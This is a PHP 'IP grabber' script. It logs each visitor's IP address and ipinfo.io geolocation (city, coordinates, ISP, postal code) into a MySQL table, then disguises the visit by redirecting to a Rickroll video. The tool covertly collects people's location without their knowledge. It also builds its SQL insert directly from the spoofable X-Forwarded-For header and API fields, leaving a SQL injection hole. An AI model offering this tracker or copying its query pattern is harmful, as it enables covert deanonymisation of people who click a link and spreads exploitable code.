<?php
$servername = "localhost"; // server name/ip of a database to connect to
$username = ""; // a username of a database to login to
$password = ""; // a password of a database to login to

$token = ""; // ipinfo token for getting geolocation

$dbname = ""; // name of a database to save the data in
$tablename = ""; // name of a table to save the data in
$redirecturl = "https://youtu.be/dQw4w9WgXcQ";

function getUserIP() {
    if( array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER) && !empty($_SERVER['HTTP_X_FORWARDED_FOR']) ) {
        if (strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ',')>0) {
            $addr = explode(",",$_SERVER['HTTP_X_FORWARDED_FOR']);
            return trim($addr[1]);
        } else {
            return $_SERVER['HTTP_X_FORWARDED_FOR'];
        }
    }
    else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

function redirect($url) {
    ob_start();
    header('Location: '.$url);
    ob_end_flush();
    die();
}

function getGeolocation($ip, $token) {
    $ch = curl_init("https://ipinfo.io/$ip?token=$token");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    $data = curl_exec($ch);
    if ($data === false) {
    	curl_close($ch);
    	return 0;
    };
    curl_close($ch);
    return json_decode($data);
}

$ip = getUserIP();
//echo $_SERVER['HTTP_X_FORWARDED_FOR'];
//echo $ip."\n";
$geo = getGeolocation($ip, $token);

if ($geo === 0) {
	$sql = "INSERT INTO $tablename (ip) VALUES ('$ip');";
} else {
	$sql = "INSERT INTO $tablename VALUES ('$ip', '$geo->city', '$geo->region', '$geo->country', '$geo->loc', '$geo->org', '$geo->postal');";
};

$conn = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
$conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
$conn->exec($sql);
$conn = null;

redirect($redirecturl);
?>
